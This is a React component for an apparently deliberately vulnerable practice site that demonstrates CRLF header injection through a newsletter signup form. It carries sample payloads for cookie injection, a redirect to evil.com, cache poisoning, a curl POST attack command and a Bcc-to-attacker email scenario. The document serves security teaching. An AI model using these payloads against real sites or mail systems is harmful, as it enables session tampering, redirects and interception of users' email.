import { useState, useEffect } from 'react'
import { useSearchParams } from 'react-router-dom'
import './Newsletter.css'

function Newsletter() {
    const [searchParams, setSearchParams] = useSearchParams()
    const [email, setEmail] = useState(searchParams.get('email') || '')
    const [submitted, setSubmitted] = useState(false)
    const [result, setResult] = useState(null)

    // Update URL when email changes
    useEffect(() => {
        const params = new URLSearchParams(searchParams)
        if (email) {
            params.set('email', email)
        } else {
            params.delete('email')
        }
        setSearchParams(params, { replace: true })
    }, [email])

    const handleSubmit = (e) => {
        e.preventDefault()

        // VULNERABLE: Detect CRLF injection attempts
        const hasCRLF = email.includes('%0d%0a') || email.includes('%0D%0A') ||
            email.includes('\\r\\n') || email.includes('\\n') ||
            email.includes('\\r') || email.includes('\r\n') ||
            email.includes('\n') || email.includes('\r')

        // Extract potential header injection
        const emailParts = email.split(/(%0d%0a|%0D%0A|\\r\\n|\\n|\\r|\r\n|\n|\r)/i)
        const actualEmail = emailParts[0]
        const injectedHeaders = emailParts.slice(1).filter(p => p && !p.match(/(%0d%0a|%0D%0A|\\r\\n|\\n|\\r|\r\n|\n|\r)/i))

        setResult({
            hasCRLF,
            actualEmail,
            injectedHeaders,
            rawInput: email
        })

        if (!hasCRLF) {
            setSubmitted(true)
        }
    }

    return (
        <>
            <div className="newsletter-hero">
                <h1>📧 Newsletter Subscription</h1>
                <p>Stay updated with IST news and events</p>
            </div>

            <div className="container">
                <div className="newsletter-content">
                    <div className="newsletter-box">
                        <h2>Subscribe to Our Newsletter</h2>

                        <div className="newsletter-info">
                            <p>📌 <strong>Testing Method:</strong> POST Request (Realistic)</p>
                            <p>Enter your email and click subscribe:</p>
                        </div>

                        <form onSubmit={handleSubmit} className="newsletter-form">
                            <div className="form-group">
                                <label htmlFor="email">Email Address:</label>
                                <input
                                    id="email"
                                    type="text"
                                    value={email}
                                    onChange={(e) => setEmail(e.target.value)}
                                    placeholder="your@email.com"
                                    className="email-input"
                                    autoComplete="off"
                                />
                            </div>

                            <button type="submit" className="btn btn-primary">
                                Subscribe Now
                            </button>
                        </form>

                        {result && (
                            <div className={`subscription-result ${result.hasCRLF ? 'vulnerable' : 'normal'}`}>
                                <h3>{result.hasCRLF ? '⚠️ CRLF Injection Detected!' : '✅ Email Received'}</h3>

                                <div className="email-details">
                                    <p><strong>Submitted via:</strong> <code>POST</code> Request</p>
                                    <p><strong>Email:</strong></p>
                                    <code className="email-value">{result.actualEmail}</code>

                                    {result.hasCRLF && result.injectedHeaders.length > 0 && (
                                        <div className="injected-headers">
                                            <p><strong>⚠️ Injected Headers Detected:</strong></p>
                                            <pre className="header-injection">
                                                {result.injectedHeaders.join('\n')}
                                            </pre>
                                            <p className="raw-input">
                                                <strong>Raw Input:</strong><br />
                                                <code>{result.rawInput}</code>
                                            </p>
                                        </div>
                                    )}

                                    {result.hasCRLF && (
                                        <div className="crlf-explanation">
                                            <h4>CRLF Injection Vulnerability</h4>
                                            <p>This input contains CRLF (Carriage Return Line Feed) sequences:</p>
                                            <ul>
                                                <li><code>%0d%0a</code> - URL-encoded CRLF</li>
                                                <li><code>\r\n</code> - Literal CRLF</li>
                                            </ul>
                                            <p><strong>Impact in Real Application:</strong></p>
                                            <ul>
                                                <li>🔴 Cookie injection (<code>Set-Cookie:</code>)</li>
                                                <li>🔴 HTTP response splitting</li>
                                                <li>🔴 Cache poisoning (<code>Content-Length: 0</code>)</li>
                                                <li>🔴 Open redirect via Location header</li>
                                                <li>🔴 XSS via injected Content-Type</li>
                                            </ul>

                                            <h4>Why POST Method?</h4>
                                            <p>Newsletter forms typically use POST requests to submit data. This is more realistic than GET parameters because:</p>
                                            <ul>
                                                <li>Forms submit via POST in production</li>
                                                <li>Email processing happens server-side</li>
                                                <li>Headers are set based on form data</li>
                                            </ul>
                                        </div>
                                    )}
                                </div>

                                {submitted && !result.hasCRLF && (
                                    <div className="success-message">
                                        ✅ Thank you for subscribing! You'll receive our newsletter.
                                    </div>
                                )}
                            </div>
                        )}
                    </div>

                    <div className="vuln-hint">
                        ⚠️ <strong>CRLF Injection Vulnerability (POST-based):</strong>
                        <br /><br />
                        This form accepts email input via POST and doesn't sanitize CRLF sequences.
                        <br /><br />
                        <strong>Why Test POST?</strong> Forms submit data via POST in real applications.
                        <br /><br />
                        <strong>Try Manual Test:</strong><br />
                        <code>curl -X POST https://ist-edu-bd.vercel.app/newsletter -d "email=test%0d%0aSet-Cookie:admin=true"</code>
                    </div>

                    <div className="sample-emails">
                        <h3>Sample Inputs (Click to Test)</h3>
                        <div className="sample-list">
                            <button onClick={() => setEmail('student@ist.edu.bd')} className="sample-btn">
                                Valid Email
                            </button>
                            <button onClick={() => setEmail('test@test.com\r\nSet-Cookie: admin=true')} className="sample-btn">
                                CRLF - Cookie Injection (\r\n)
                            </button>
                            <button onClick={() => setEmail('test%0d%0aSet-Cookie: admin=true')} className="sample-btn">
                                CRLF - Cookie Injection (%0d%0a)
                            </button>
                            <button onClick={() => setEmail('test\r\nLocation: https://evil.com')} className="sample-btn">
                                CRLF - Redirect Injection
                            </button>
                            <button onClick={() => setEmail('test\r\nContent-Length: 0')} className="sample-btn">
                                CRLF - Cache Poisoning
                            </button>
                        </div>
                    </div>

                    <div className="attack-context">
                        <h3>🎯 Attack Context: Why Test Newsletter Forms?</h3>
                        <div className="context-content">
                            <p><strong>Target:</strong> Email subscription forms</p>
                            <p><strong>Thought Process:</strong></p>
                            <ul>
                                <li>Newsletter forms are common on university websites</li>
                                <li>Forms submit via POST (realistic attack vector)</li>
                                <li>Email systems process HTTP-style headers</li>
                                <li>User input often flows into email headers</li>
                                <li>CRLF can inject malicious headers</li>
                            </ul>
                            <p><strong>Real-World Scenario:</strong></p>
                            <p className="scenario">
                                Attacker submits:<br />
                                <code>victim@test.com\r\nBcc: attacker@evil.com</code>
                                <br /><br />
                                Result: Emails sent to victim also BCC'd to attacker
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </>
    )
}

export default Newsletter
